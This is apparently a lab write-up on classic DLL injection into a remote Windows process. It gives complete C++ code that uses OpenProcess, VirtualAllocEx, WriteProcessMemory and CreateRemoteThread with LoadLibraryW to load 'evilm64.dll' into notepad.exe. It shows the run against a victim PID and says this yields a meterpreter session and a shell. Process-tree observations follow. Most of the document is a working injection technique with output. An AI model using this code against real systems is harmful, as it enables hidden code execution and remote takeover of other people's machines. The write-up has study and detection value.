# DLL Injection

This lab attempts a classic DLL injection into a remote process.

### Execution

{% code title="inject-dll.cpp" %}
```cpp
int main(int argc, char *argv[]) {
	HANDLE processHandle;
	PVOID remoteBuffer;
	wchar_t dllPath[] = TEXT("C:\\experiments\\evilm64.dll");
	
	printf("Injecting DLL to PID: %i\n", atoi(argv[1]));
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);	
	WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
	PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
	CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
	CloseHandle(processHandle); 
	
	return 0;
}
```
{% endcode %}

Compiling the above code and executing it with a supplied argument of `4892` which is a PID of the notepad.exe process on the victim system:

{% code title="attacker\@victim" %}
```csharp
PS C:\experiments\inject1\x64\Debug> .\inject1.exe 4892
Injecting DLL to PID: 4892
```
{% endcode %}

After the DLL is successfully injected, the attacker receives a meterpreter session from the injected process and its privileges:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKwdt_UBG86rVX3XZ2x%2F-LKwe8C1B9bH2TeIu73z%2Finject-dll-shell.png?alt=media\&token=eb1b614d-f45a-4f70-a465-4b9bb400b647)

### Observations

Note how the notepad spawned rundll32 which then spawned a cmd.exe because of the meterpreter payload (and attacker's `shell` command) that got executed as part of the injected evilm64.dll into the notepad process:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKwdt_UBG86rVX3XZ2x%2F-LKwe556aCAPH4AAKFn7%2Finject-dll.png?alt=media\&token=61a84412-13df-4290-9deb-7a822d1758c2)

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKwdt_UBG86rVX3XZ2x%2F-LKwe2epU_trlbY-O06I%2Finject-dll-procmon.png?alt=media\&token=61f35321-a86d-4da2-b3a9-a4a209a66338)

### References

{% embed url="https://msdn.microsoft.com/en-us/library/windows/desktop/ms683212(v=vs.85).aspx" %}

{% embed url="https://msdn.microsoft.com/en-us/library/windows/desktop/ms684175(v=vs.85).aspx" %}
